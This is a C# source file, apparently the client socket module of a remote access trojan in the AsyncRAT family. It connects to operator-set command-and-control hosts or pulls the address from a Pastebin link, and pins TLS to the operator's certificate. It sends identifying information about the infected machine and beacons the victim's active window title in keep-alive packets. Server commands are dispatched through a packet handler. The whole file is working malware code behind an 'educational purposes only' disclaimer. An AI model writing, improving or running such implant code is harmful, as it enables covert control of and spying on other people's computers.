using Client.Handle_Packet;
using Client.Helper;
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using System.Net.Security;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Net;
using MessagePackLib.MessagePack;
using System.Threading.Tasks;

//       │ Author     : NYAN CAT
//       │ Name       : Improved Nyan Socket v0.2
//       │ Contact    : https://github.com/NYAN-x-CAT

//       This program is distributed for educational purposes only.

namespace Client.Connection
{
    public static class ImprovedClientSocket
    {
        // Connection objects
        public static Socket TcpClient { get; private set; }
        public static SslStream SslClient { get; private set; }
        
        // Buffer management
        private static byte[] Buffer { get; set; }
        private static long HeaderSize { get; set; }
        private static long Offset { get; set; }
        
        // Connection state
        public static bool IsConnected { get; private set; }
        private static volatile bool _isDisconnecting = false;
        
        // Synchronization
        private static readonly object SendSync = new object();
        private static readonly object ConnectionSync = new object();
        
        // Keep-alive and ping
        private static Timer KeepAlive { get; set; }
        private static Timer Ping { get; set; }
        public static int Interval { get; set; }
        public static bool ActivatePong { get; set; }
        
        // Configuration constants
        private const int BUFFER_SIZE = 50 * 1024;
        private const int CHUNK_SIZE = 50 * 1000;
        private const int MAX_MESSAGE_SIZE = 100 * 1024 * 1024; // 100MB max
        private const int CONNECTION_TIMEOUT_MS = 15000; // 15 seconds
        private const int KEEP_ALIVE_MIN_INTERVAL = 10000; // 10 seconds
        private const int KEEP_ALIVE_MAX_INTERVAL = 15000; // 15 seconds

        public static async Task<bool> InitializeClientAsync()
        {
            try
            {
                lock (ConnectionSync)
                {
                    if (IsConnected)
                    {
                        WriteDebugLog("Client already connected");
                        return true;
                    }

                    _isDisconnecting = false;
                }

                WriteDebugLog("Initializing client connection...");

                // Create socket with improved configuration
                TcpClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                {
                    ReceiveBufferSize = BUFFER_SIZE,
                    SendBufferSize = BUFFER_SIZE,
                    NoDelay = true, // Disable Nagle algorithm for better performance
                    ReceiveTimeout = CONNECTION_TIMEOUT_MS,
                    SendTimeout = CONNECTION_TIMEOUT_MS
                };

                // Attempt connection
                bool connected = await ConnectWithRetryAsync();
                if (!connected)
                {
                    WriteDebugLog("Failed to establish connection");
                    return false;
                }

                // Initialize SSL
                if (!await InitializeSslAsync())
                {
                    WriteDebugLog("Failed to initialize SSL");
                    await DisconnectAsync();
                    return false;
                }

                // Initialize communication
                await InitializeCommunicationAsync();

                WriteDebugLog("Client initialized successfully");
                return true;
            }
            catch (Exception ex)
            {
                WriteDebugLog($"Client initialization failed: {ex.Message}");
                await DisconnectAsync();
                return false;
            }
        }

        private static async Task<bool> ConnectWithRetryAsync()
        {
            try
            {
                if (Settings.Pastebin != "null")
                {
                    return await ConnectViaPastebinAsync();
                }
                else
                {
                    return await ConnectDirectAsync();
                }
            }
            catch (Exception ex)
            {
                WriteDebugLog($"Connection attempt failed: {ex.Message}");
                return false;
            }
        }

        private static async Task<bool> ConnectDirectAsync()
        {
            try
            {
                string[] hosts = Settings.Hosts.Split(',');
                string[] ports = Settings.Ports.Split(',');

                // Randomize connection attempts
                var random = new Random();
                string serverIP = hosts[random.Next(hosts.Length)].Trim();
                int serverPort = Convert.ToInt32(ports[random.Next(ports.Length)].Trim());

                WriteDebugLog($"Attempting to connect to {serverIP}:{serverPort}");

                if (IsValidDomainName(serverIP))
                {
                    return await ConnectToDomainAsync(serverIP, serverPort);
                }
                else
                {
                    return await ConnectToIpAsync(serverIP, serverPort);
                }
            }
            catch (Exception ex)
            {
                WriteDebugLog($"Direct connection failed: {ex.Message}");
                return false;
            }
        }

        private static async Task<bool> ConnectToDomainAsync(string domain, int port)
        {
            try
            {
                IPAddress[] addresses = await Dns.GetHostAddressesAsync(domain);
                
                foreach (IPAddress address in addresses)
                {
                    try
                    {
                        WriteDebugLog($"Trying IP {address} for domain {domain}");
                        
                        var connectTask = Task.Run(() => TcpClient.Connect(address, port));
                        if (await Task.WhenAny(connectTask, Task.Delay(CONNECTION_TIMEOUT_MS)) == connectTask)
                        {
                            if (TcpClient.Connected)
                            {
                                WriteDebugLog($"Successfully connected to {address}:{port}");
                                return true;
                            }
                        }
                        else
                        {
                            WriteDebugLog($"Connection timeout to {address}:{port}");
                        }
                    }
                    catch (Exception ex)
                    {
                        WriteDebugLog($"Failed to connect to {address}: {ex.Message}");
                    }
                }

                return false;
            }
            catch (Exception ex)
            {
                WriteDebugLog($"Domain resolution failed: {ex.Message}");
                return false;
            }
        }

        private static async Task<bool> ConnectToIpAsync(string ip, int port)
        {
            try
            {
                var connectTask = Task.Run(() => TcpClient.Connect(ip, port));
                if (await Task.WhenAny(connectTask, Task.Delay(CONNECTION_TIMEOUT_MS)) == connectTask)
                {
                    if (TcpClient.Connected)
                    {
                        WriteDebugLog($"Successfully connected to {ip}:{port}");
                        return true;
                    }
                }
                else
                {
                    WriteDebugLog($"Connection timeout to {ip}:{port}");
                }

                return false;
            }
            catch (Exception ex)
            {
                WriteDebugLog($"IP connection failed: {ex.Message}");
                return false;
            }
        }

        private static async Task<bool> ConnectViaPastebinAsync()
        {
            try
            {
                WriteDebugLog("Connecting via Pastebin configuration");

                using (var webClient = new WebClient())
                {
                    webClient.Credentials = new NetworkCredential("", "");
                    
                    var downloadTask = webClient.DownloadStringTaskAsync(Settings.Pastebin);
                    if (await Task.WhenAny(downloadTask, Task.Delay(CONNECTION_TIMEOUT_MS)) == downloadTask)
                    {
                        string response = await downloadTask;
                        string[] parts = response.Split(new[] { ":" }, StringSplitOptions.RemoveEmptyEntries);
                        
                        if (parts.Length >= 2)
                        {
                            Settings.Hosts = parts[0].Trim();
                            Settings.Ports = parts[new Random().Next(1, parts.Length)].Trim();
                            
                            return await ConnectToIpAsync(Settings.Hosts, Convert.ToInt32(Settings.Ports));
                        }
                    }
                    else
                    {
                        WriteDebugLog("Pastebin download timeout");
                    }
                }

                return false;
            }
            catch (Exception ex)
            {
                WriteDebugLog($"Pastebin connection failed: {ex.Message}");
                return false;
            }
        }

        private static async Task<bool> InitializeSslAsync()
        {
            try
            {
                WriteDebugLog("Initializing SSL connection");

                SslClient = new SslStream(new NetworkStream(TcpClient, true), false, ValidateServerCertificate);
                
                string targetHost = TcpClient.RemoteEndPoint.ToString().Split(':')[0];
                
                var authTask = Task.Run(() => SslClient.AuthenticateAsClient(targetHost, null, SslProtocols.Tls12 | SslProtocols.Tls11 | SslProtocols.Tls, false));
                if (await Task.WhenAny(authTask, Task.Delay(CONNECTION_TIMEOUT_MS)) == authTask)
                {
                    WriteDebugLog("SSL authentication completed");
                    return true;
                }
                else
                {
                    WriteDebugLog("SSL authentication timeout");
                    return false;
                }
            }
            catch (Exception ex)
            {
                WriteDebugLog($"SSL initialization failed: {ex.Message}");
                return false;
            }
        }

        private static async Task InitializeCommunicationAsync()
        {
            try
            {
                lock (ConnectionSync)
                {
                    IsConnected = true;
                }

                // Initialize buffer
                HeaderSize = 4;
                Buffer = new byte[HeaderSize];
                Offset = 0;

                // Send initial identification
                await Task.Run(() => Send(IdSender.SendInfo()));

                // Initialize keep-alive and ping
                Interval = 0;
                ActivatePong = false;

                var random = new Random();
                KeepAlive = new Timer(KeepAlivePacket, null, 
                    random.Next(KEEP_ALIVE_MIN_INTERVAL, KEEP_ALIVE_MAX_INTERVAL),
                    random.Next(KEEP_ALIVE_MIN_INTERVAL, KEEP_ALIVE_MAX_INTERVAL));

                Ping = new Timer(Pong, null, 1, 1);

                // Start reading data
                SslClient.BeginRead(Buffer, (int)Offset, (int)HeaderSize, ReadServerData, null);

                WriteDebugLog("Communication initialized");
            }
            catch (Exception ex)
            {
                WriteDebugLog($"Communication initialization failed: {ex.Message}");
                throw;
            }
        }

        public static async Task DisconnectAsync()
        {
            try
            {
                lock (ConnectionSync)
                {
                    if (_isDisconnecting)
                        return;

                    _isDisconnecting = true;
                    IsConnected = false;
                }

                WriteDebugLog("Disconnecting client...");

                // Dispose timers
                KeepAlive?.Dispose();
                Ping?.Dispose();

                // Close SSL stream
                try
                {
                    SslClient?.Close();
                    SslClient?.Dispose();
                }
                catch (Exception ex)
                {
                    WriteDebugLog($"Error closing SSL stream: {ex.Message}");
                }

                // Close TCP client
                try
                {
                    TcpClient?.Close();
                    TcpClient?.Dispose();
                }
                catch (Exception ex)
                {
                    WriteDebugLog($"Error closing TCP client: {ex.Message}");
                }

                // Reset references
                SslClient = null;
                TcpClient = null;
                KeepAlive = null;
                Ping = null;

                WriteDebugLog("Client disconnected");
            }
            catch (Exception ex)
            {
                WriteDebugLog($"Error during disconnect: {ex.Message}");
            }
            finally
            {
                lock (ConnectionSync)
                {
                    _isDisconnecting = false;
                }
            }
        }

        // Legacy method for backward compatibility
        public static void Reconnect()
        {
            Task.Run(async () => await DisconnectAsync());
        }

        // Legacy method for backward compatibility
        public static void InitializeClient()
        {
            Task.Run(async () => await InitializeClientAsync());
        }

        private static void ReadServerData(IAsyncResult ar)
        {
            try
            {
                if (!IsConnected || SslClient == null || _isDisconnecting)
                {
                    return;
                }

                int received = SslClient.EndRead(ar);
                if (received > 0)
                {
                    Offset += received;
                    HeaderSize -= received;

                    if (HeaderSize == 0)
                    {
                        // Read header to get message size
                        int messageSize = BitConverter.ToInt32(Buffer, 0);
                        WriteDebugLog($"Incoming message size: {messageSize} bytes");

                        // Validate message size
                        if (messageSize <= 0 || messageSize > MAX_MESSAGE_SIZE)
                        {
                            WriteDebugLog($"Invalid message size: {messageSize}");
                            Task.Run(async () => await DisconnectAsync());
                            return;
                        }

                        // Read message body
                        if (!ReadMessageBody(messageSize))
                        {
                            Task.Run(async () => await DisconnectAsync());
                            return;
                        }

                        // Reset for next message
                        ResetBuffer();
                    }
                    else if (HeaderSize < 0)
                    {
                        WriteDebugLog("Invalid header size");
                        Task.Run(async () => await DisconnectAsync());
                        return;
                    }

                    // Continue reading
                    if (IsConnected && !_isDisconnecting)
                    {
                        SslClient.BeginRead(Buffer, (int)Offset, (int)HeaderSize, ReadServerData, null);
                    }
                }
                else
                {
                    WriteDebugLog("Server closed connection");
                    Task.Run(async () => await DisconnectAsync());
                }
            }
            catch (Exception ex)
            {
                WriteDebugLog($"Error reading server data: {ex.Message}");
                Task.Run(async () => await DisconnectAsync());
            }
        }

        private static bool ReadMessageBody(int messageSize)
        {
            try
            {
                Offset = 0;
                Buffer = new byte[messageSize];
                int totalReceived = 0;

                while (totalReceived < messageSize && IsConnected && !_isDisconnecting)
                {
                    int received = SslClient.Read(Buffer, totalReceived, messageSize - totalReceived);
                    if (received <= 0)
                    {
                        WriteDebugLog("Connection lost while reading message body");
                        return false;
                    }

                    totalReceived += received;
                }

                if (totalReceived == messageSize)
                {
                    // Process message in separate thread
                    ThreadPool.QueueUserWorkItem(_ => ProcessMessage(Buffer));
                    return true;
                }

                return false;
            }
            catch (Exception ex)
            {
                WriteDebugLog($"Error reading message body: {ex.Message}");
                return false;
            }
        }

        private static void ProcessMessage(byte[] messageData)
        {
            try
            {
                // Create a copy of the data to avoid issues with buffer reuse
                byte[] messageCopy = new byte[messageData.Length];
                Array.Copy(messageData, messageCopy, messageData.Length);

                // Process the message
                Packet.Read(messageCopy);
            }
            catch (Exception ex)
            {
                WriteDebugLog($"Error processing message: {ex.Message}");
            }
        }

        private static void ResetBuffer()
        {
            Offset = 0;
            HeaderSize = 4;
            Buffer = new byte[HeaderSize];
        }

        public static bool Send(byte[] message)
        {
            if (message == null || message.Length == 0)
            {
                WriteDebugLog("Attempted to send null or empty message");
                return false;
            }

            lock (SendSync)
            {
                try
                {
                    if (!IsConnected || SslClient == null || _isDisconnecting)
                    {
                        WriteDebugLog("Cannot send - not connected");
                        return false;
                    }

                    // Validate message size
                    if (message.Length > MAX_MESSAGE_SIZE)
                    {
                        WriteDebugLog($"Message too large: {message.Length} bytes");
                        return false;
                    }

                    // Send message size header
                    byte[] sizeHeader = BitConverter.GetBytes(message.Length);
                    if (!TcpClient.Poll(1000, SelectMode.SelectWrite))
                    {
                        WriteDebugLog("Socket not ready for writing");
                        return false;
                    }

                    SslClient.Write(sizeHeader, 0, sizeHeader.Length);

                    // Send message body
                    if (message.Length > 1000000) // 1MB - send in chunks
                    {
                        return SendLargeMessage(message);
                    }
                    else
                    {
                        return SendSmallMessage(message);
                    }
                }
                catch (Exception ex)
                {
                    WriteDebugLog($"Send failed: {ex.Message}");
                    Task.Run(async () => await DisconnectAsync());
                    return false;
                }
            }
        }

        private static bool SendLargeMessage(byte[] message)
        {
            try
            {
                WriteDebugLog($"Sending large message in chunks: {message.Length} bytes");

                using (var memoryStream = new MemoryStream(message))
                {
                    byte[] chunk = new byte[CHUNK_SIZE];
                    int bytesRead;

                    while ((bytesRead = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
                    {
                        if (!TcpClient.Poll(1000, SelectMode.SelectWrite))
                        {
                            WriteDebugLog("Socket not ready for writing chunk");
                            return false;
                        }

                        SslClient.Write(chunk, 0, bytesRead);
                        SslClient.Flush();
                    }
                }

                WriteDebugLog("Large message sent successfully");
                return true;
            }
            catch (Exception ex)
            {
                WriteDebugLog($"Failed to send large message: {ex.Message}");
                return false;
            }
        }

        private static bool SendSmallMessage(byte[] message)
        {
            try
            {
                if (!TcpClient.Poll(1000, SelectMode.SelectWrite))
                {
                    WriteDebugLog("Socket not ready for writing");
                    return false;
                }

                SslClient.Write(message, 0, message.Length);
                SslClient.Flush();
                return true;
            }
            catch (Exception ex)
            {
                WriteDebugLog($"Failed to send small message: {ex.Message}");
                return false;
            }
        }

        private static void KeepAlivePacket(object obj)
        {
            try
            {
                if (!IsConnected || _isDisconnecting)
                    return;

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "Ping";
                msgpack.ForcePathObject("Message").AsString = Methods.GetActiveWindowTitle();
                
                if (Send(msgpack.Encode2Bytes()))
                {
                    ActivatePong = true;
                }

                // Force garbage collection less frequently
                if (new Random().Next(10) == 0)
                {
                    GC.Collect(0, GCCollectionMode.Optimized);
                }
            }
            catch (Exception ex)
            {
                WriteDebugLog($"Keep-alive packet failed: {ex.Message}");
            }
        }

        private static void Pong(object obj)
        {
            try
            {
                if (ActivatePong && IsConnected && !_isDisconnecting)
                {
                    Interval++;
                    
                    // Reset pong flag after reasonable time
                    if (Interval > 60000) // 1 minute
                    {
                        ActivatePong = false;
                        Interval = 0;
                    }
                }
            }
            catch (Exception ex)
            {
                WriteDebugLog($"Pong processing failed: {ex.Message}");
            }
        }

        private static bool IsValidDomainName(string name)
        {
            try
            {
                return !string.IsNullOrWhiteSpace(name) && Uri.CheckHostName(name) != UriHostNameType.Unknown;
            }
            catch
            {
                return false;
            }
        }

        private static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
            try
            {
#if DEBUG
                WriteDebugLog($"SSL Policy Errors: {sslPolicyErrors}");
                return true; // Accept all certificates in debug mode
#endif
                if (Settings.ServerCertificate == null)
                {
                    WriteDebugLog("Server certificate not configured");
                    return false;
                }

                bool isValid = Settings.ServerCertificate.Equals(certificate);
                if (!isValid)
                {
                    WriteDebugLog("Server certificate validation failed");
                }

                return isValid;
            }
            catch (Exception ex)
            {
                WriteDebugLog($"Certificate validation error: {ex.Message}");
                return false;
            }
        }

        private static void WriteDebugLog(string message)
        {
            try
            {
#if DEBUG
                Debug.WriteLine($"[ImprovedClientSocket] {DateTime.Now:HH:mm:ss.fff} {message}");
#endif
            }
            catch
            {
                // Ignore logging errors
            }
        }

        // Public method to get connection statistics
        public static ConnectionStatistics GetStatistics()
        {
            return new ConnectionStatistics
            {
                IsConnected = IsConnected,
                Interval = Interval,
                ActivatePong = ActivatePong,
                RemoteEndPoint = TcpClient?.RemoteEndPoint?.ToString(),
                LocalEndPoint = TcpClient?.LocalEndPoint?.ToString()
            };
        }
    }

    public class ConnectionStatistics
    {
        public bool IsConnected { get; set; }
        public int Interval { get; set; }
        public bool ActivatePong { get; set; }
        public string RemoteEndPoint { get; set; }
        public string LocalEndPoint { get; set; }
    }
}